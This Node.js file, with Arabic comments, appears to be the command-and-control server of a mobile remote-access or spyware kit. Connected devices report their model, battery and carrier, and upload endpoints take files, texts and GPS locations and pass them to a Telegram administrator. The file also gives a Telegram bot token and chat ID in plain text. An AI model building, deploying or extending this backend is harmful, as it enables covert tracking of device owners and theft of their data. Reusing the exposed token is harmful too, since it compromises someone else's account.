const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');

// ==================== الإعدادات ====================
// 🔴 🔴 🔴 ضع التوكن والآيدي هنا 🔴 🔴 🔴
const BOT_TOKEN = process.env.BOT_TOKEN || '8275181418:AAHRGLNjc6JxI2wiboqDJFpw3HEvCugn4fA';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '7604667042';
const SERVER_PORT = process.env.PORT || 3000;

// ==================== التحقق من الإعدادات ====================
if (BOT_TOKEN.includes('ضع_توكن')) {
    console.error('❌ خطأ: لم تضف توكن البوت!');
    console.log('📝 اذهب إلى @BotFather في تيليجرام واحصل على التوكن');
    process.exit(1);
}

if (ADMIN_CHAT_ID.includes('ضع_آيدي')) {
    console.error('❌ خطأ: لم تضف آيدي الدردشة!');
    console.log('📝 اذهب إلى @userinfobot في تيليجرام واحصل على الآيدي');
    process.exit(1);
}

// ==================== تهيئة التطبيق ====================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// إعدادات الملفات
const upload = multer({
    limits: {
        fileSize: 10 * 1024 * 1024 // 10MB
    }
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ==================== إعداد البوت ====================
console.log('🔧 جاري تهيئة بوت التليجرام...');
const bot = new TelegramBot(BOT_TOKEN, { 
    polling: true,
    request: {
        timeout: 60000
    }
});

// التحقق من اتصال البوت
bot.getMe().then(botInfo => {
    console.log(`✅ البوت يعمل: @${botInfo.username}`);
}).catch(error => {
    console.error('❌ خطأ في البوت:', error.message);
    process.exit(1);
});

// ==================== إدارة الأجهزة ====================
const connectedDevices = new Map();
const deviceSessions = new Map();

// ==================== مسارات الويب ====================
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>نظام التحكم في الأجهزة</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                direction: rtl; 
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: rgba(255,255,255,0.1);
                padding: 30px;
                border-radius: 15px;
                backdrop-filter: blur(10px);
            }
            .stats { 
                background: rgba(255,255,255,0.2); 
                padding: 20px; 
                border-radius: 10px; 
                margin-bottom: 20px;
            }
            .device { 
                border: 1px solid rgba(255,255,255,0.3); 
                padding: 15px; 
                margin: 10px 0; 
                border-radius: 5px; 
                background: rgba(255,255,255,0.1);
            }
            h1 { text-align: center; margin-bottom: 30px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 نظام التحكم في الأجهزة</h1>
            <div class="stats">
                <h3>📊 الإحصائيات:</h3>
                <p>📱 الأجهزة المتصلة: <strong>${connectedDevices.size}</strong></p>
                <p>⏰ وقت الخادم: <strong>${new Date().toLocaleString('ar-SA')}</strong></p>
                <p>🚀 حالة النظام: <strong>🟢 يعمل</strong></p>
            </div>
            <div class="devices">
                <h3>📲 الأجهزة المتصلة:</h3>
                ${Array.from(connectedDevices.values()).map(device => `
                    <div class="device">
                        <strong>${device.info.model}</strong><br>
                        🔋 ${device.info.battery}% | 📶 ${device.info.version}<br>
                        ⏰ متصل منذ: ${Math.round((new Date() - device.connectedAt) / 60000)} دقيقة
                    </div>
                `).join('') || '<p>لا توجد أجهزة متصلة</p>'}
            </div>
        </div>
    </body>
    </html>
    `);
});

// ==================== مسارات API ====================
app.post('/uploadFile', upload.single('file'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'لم يتم اختيار ملف' });
        }

        const { deviceId } = req.body;
        const fileInfo = {
            originalname: req.file.originalname,
            mimetype: req.file.mimetype,
            size: req.file.size
        };

        // إرسال إشعار للمسؤول
        bot.sendMessage(ADMIN_CHAT_ID, 
            `📁 تم رفع ملف جديد:\n` +
            `📝 الاسم: ${fileInfo.originalname}\n` +
            `📊 الحجم: ${(fileInfo.size / 1024 / 1024).toFixed(2)} MB\n` +
            `🔗 النوع: ${fileInfo.mimetype}`
        );

        res.json({ success: true, message: 'تم رفع الملف بنجاح' });
    } catch (error) {
        console.error('❌ خطأ في رفع الملف:', error);
        res.status(500).json({ error: 'خطأ في رفع الملف' });
    }
});

app.post('/uploadText', (req, res) => {
    try {
        const { text, deviceId } = req.body;
        
        if (!text) {
            return res.status(400).json({ error: 'النص مطلوب' });
        }

        // إرسال إشعار للمسؤول
        bot.sendMessage(ADMIN_CHAT_ID, 
            `📨 تم استلام نص جديد:\n` +
            `📝 النص: ${text}\n` +
            `📱 الجهاز: ${deviceId || 'جميع الأجهزة'}`
        );

        res.json({ success: true, message: 'تم استلام النص بنجاح' });
    } catch (error) {
        console.error('❌ خطأ في استلام النص:', error);
        res.status(500).json({ error: 'خطأ في استلام النص' });
    }
});

app.post('/uploadLocation', (req, res) => {
    try {
        const { lat, lon, deviceId } = req.body;
        
        if (!lat || !lon) {
            return res.status(400).json({ error: 'الإحداثيات مطلوبة' });
        }

        // إرسال إشعار للمسؤول
        bot.sendMessage(ADMIN_CHAT_ID, 
            `📍 تم استلام موقع جديد:\n` +
            `📌 خط العرض: ${lat}\n` +
            `📌 خط الطول: ${lon}\n` +
            `📱 الجهاز: ${deviceId || 'غير محدد'}`
        );

        res.json({ success: true, message: 'تم استلام الموقع بنجاح' });
    } catch (error) {
        console.error('❌ خطأ في استلام الموقع:', error);
        res.status(500).json({ error: 'خطأ في استلام الموقع' });
    }
});

// ==================== WebSocket Handling ====================
wss.on('connection', (ws, req) => {
    console.log('🔌 محاولة اتصال جديدة من جهاز...');

    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            
            // معالجة بيانات الجهاز (كما في السيرفر القديم)
            if (message.headers) {
                const deviceInfo = {
                    model: message.headers.model || 'غير معروف',
                    battery: message.headers.battery || 'غير معروف',
                    version: message.headers.version || 'غير معروف',
                    brightness: message.headers.brightness || 'غير معروف',
                    provider: message.headers.provider || 'غير معروف'
                };

                const deviceId = uuidv4();
                
                const deviceData = {
                    id: deviceId,
                    ws: ws,
                    info: deviceInfo,
                    connectedAt: new Date(),
                    lastActivity: new Date(),
                    status: 'online'
                };

                connectedDevices.set(deviceId, deviceData);
                ws.deviceId = deviceId;

                // إرسال تأكيد الاتصال
                ws.send(JSON.stringify({
                    type: 'connection_established',
                    deviceId: deviceId,
                    timestamp: new Date().toISOString()
                }));

                // إشعار المسؤول
                bot.sendMessage(ADMIN_CHAT_ID, 
                    `🟢 *جهاز جديد متصل*\n\n` +
                    `📱 *النموذج:* ${deviceInfo.model}\n` +
                    `🔋 *البطارية:* ${deviceInfo.battery}%\n` +
                    `📶 *الإصدار:* ${deviceInfo.version}\n` +
                    `🆔 *المعرف:* \`${deviceId}\``,
                    { parse_mode: 'Markdown' }
                );

                console.log(`📱 جهاز متصل: ${deviceInfo.model} (${deviceId})`);
            }

            // تحديث النشاط
            if (ws.deviceId) {
                const device = connectedDevices.get(ws.deviceId);
                if (device) {
                    device.lastActivity = new Date();
                }
            }
        } catch (error) {
            console.error('❌ خطأ في معالجة رسالة WebSocket:', error);
        }
    });

    ws.on('close', () => {
        if (ws.deviceId) {
            const device = connectedDevices.get(ws.deviceId);
            if (device) {
                connectedDevices.delete(ws.deviceId);
                console.log(`📴 جهاز منفصل: ${device.info.model} (${ws.deviceId})`);
                
                // إشعار المسؤول
                bot.sendMessage(ADMIN_CHAT_ID, 
                    `🔴 *جهاز منفصل*\n\n` +
                    `📱 *النموذج:* ${device.info.model}\n` +
                    `🆔 *المعرف:* \`${ws.deviceId}\``,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    });

    ws.on('error', (error) => {
        console.error('❌ خطأ في WebSocket:', error);
        if (ws.deviceId) {
            connectedDevices.delete(ws.deviceId);
        }
    });
});

// ==================== معالجة أوامر البوت ====================
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            ['📱 قائمة الأجهزة', '🔍 معلومات الجهاز'],
            ['📨 إرسال رسالة', '📍 إرسال موقع'],
            ['📁 إرسال ملف', '🔔 إشعار'],
            ['📊 الإحصائيات', '🔄 تحديث']
        ],
        resize_keyboard: true
    }
};

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // التحقق من الصلاحيات
    if (chatId != ADMIN_CHAT_ID) {
        bot.sendMessage(chatId, '❌ غير مصرح لك باستخدام هذا البوت');
        return;
    }

    try {
        switch(text) {
            case '/start':
            case '🏠 القائمة الرئيسية':
                const welcomeMessage = `
🎯 *مرحباً بك في نظام التحكم في الأجهزة*

📊 **الإحصائيات الحالية:**
• 📱 الأجهزة المتصلة: ${connectedDevices.size}
• ⏰ وقت التشغيل: ${new Date().toLocaleString('ar-SA')}

🛠 **اختر من الأوامر التالية:**
                `;
                bot.sendMessage(chatId, welcomeMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: mainKeyboard.reply_markup
                });
                break;

            case '📱 قائمة الأجهزة':
                if (connectedDevices.size === 0) {
                    bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً', mainKeyboard);
                    return;
                }

                let deviceList = `📱 *قائمة الأجهزة المتصلة (${connectedDevices.size})*:\n\n`;
                
                connectedDevices.forEach((device, index) => {
                    const uptime = Math.round((new Date() - device.connectedAt) / 60000);
                    deviceList += `*${index + 1}. ${device.info.model}*\n`;
                    deviceList += `   🆔: \`${device.id}\`\n`;
                    deviceList += `   🔋 البطارية: ${device.info.battery}%\n`;
                    deviceList += `   📶 الإصدار: ${device.info.version}\n`;
                    deviceList += `   ⏰ متصل منذ: ${uptime} دقيقة\n\n`;
                });

                bot.sendMessage(chatId, deviceList, {
                    parse_mode: 'Markdown'
                });
                break;

            case '📊 الإحصائيات':
                const stats = `
📊 *إحصائيات النظام*

📱 الأجهزة المتصلة: *${connectedDevices.size}*
🕒 وقت التشغيل: *${new Date().toLocaleString('ar-SA')}*
💾 استخدام الذاكرة: *${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB*
                `;
                bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
                break;

            case '🔄 تحديث':
                bot.sendMessage(chatId, '✅ تم تحديث المعلومات', mainKeyboard);
                break;

            default:
                bot.sendMessage(chatId, '❌ أمر غير معروف، الرجاء استخدام القائمة', mainKeyboard);
        }
    } catch (error) {
        console.error('❌ خطأ في معالجة رسالة البوت:', error);
        bot.sendMessage(chatId, '❌ حدث خطأ، الرجاء المحاولة لاحقاً');
    }
});

// ==================== الصيانة التلقائية ====================
setInterval(() => {
    const now = new Date();
    connectedDevices.forEach((device, deviceId) => {
        const inactiveTime = now - device.lastActivity;
        if (inactiveTime > 5 * 60 * 1000) { // 5 دقائق
            console.log(`🔴 فصل جهاز غير نشط: ${device.info.model}`);
            device.ws.close();
            connectedDevices.delete(deviceId);
        }
    });
}, 5 * 60 * 1000);

// ==================== بدء التشغيل ====================
server.listen(SERVER_PORT, () => {
    console.log(`
🎯 نظام التحكم في الأجهزة يعمل بنجاح!
📍 PORT: ${SERVER_PORT}
🤖 البوت: جاهز للإستقبال
⏰ الوقت: ${new Date().toLocaleString()}
📱 انتظر اتصال الأجهزة...
🔗 رابط الويب: http://localhost:${SERVER_PORT}
    `);
});

// ==================== معالجة الأخطاء ====================
process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ رفض وعد غير معالج:', reason);
});
